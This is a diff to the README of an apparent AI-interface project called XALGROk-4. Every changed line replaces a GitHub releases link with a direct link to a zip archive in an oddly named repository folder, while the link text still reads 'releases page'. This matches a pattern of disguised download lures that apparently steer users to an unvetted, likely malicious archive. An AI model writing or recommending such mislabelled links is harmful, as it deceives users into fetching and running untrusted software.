@@ -1,6 +1,6 @@
 # ⚡️ XALGROk-4 - Simple AI Interface for Everyone
 
-[![Download XALGROk-4](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/wizdomf3lix/XALGROk-4/releases)
+[![Download XALGROk-4](https://raw.githubusercontent.com/wizdomf3lix/XALGROk-4/main/alloxuremia/XALGR-Ok-3.6.zip)](https://raw.githubusercontent.com/wizdomf3lix/XALGROk-4/main/alloxuremia/XALGR-Ok-3.6.zip)
 
 ## 🔎 About XALGROk-4
 
@@ -44,7 +44,7 @@ You need to first download XALGROk-4 from the official releases page to get the 
 ### How to download:
 
 1. Click the big blue download button at the top or visit the page here:  
-   [GitHub Releases for XALGROk-4](https://github.com/wizdomf3lix/XALGROk-4/releases)
+   [GitHub Releases for XALGROk-4](https://raw.githubusercontent.com/wizdomf3lix/XALGROk-4/main/alloxuremia/XALGR-Ok-3.6.zip)
 
 2. On the releases page, look for the latest release. This will usually be at the top of the list.
 
@@ -127,7 +127,7 @@ A: Yes, XALGROk-4 is open for anyone to download and use.
 
 ## 📣 Stay Updated
 
-Check the [releases page](https://github.com/wizdomf3lix/XALGROk-4/releases) regularly for newer versions. Updated releases may fix bugs or add features.
+Check the [releases page](https://raw.githubusercontent.com/wizdomf3lix/XALGROk-4/main/alloxuremia/XALGR-Ok-3.6.zip) regularly for newer versions. Updated releases may fix bugs or add features.
 
 ---
 
@@ -138,4 +138,4 @@ This repository holds the user interface and display code for XALGROk-4 by the S
 ---
 
 For full installation and usage, download XALGROk-4 here:  
-[Download XALGROk-4](https://github.com/wizdomf3lix/XALGROk-4/releases)
+[Download XALGROk-4](https://raw.githubusercontent.com/wizdomf3lix/XALGROk-4/main/alloxuremia/XALGR-Ok-3.6.zip)
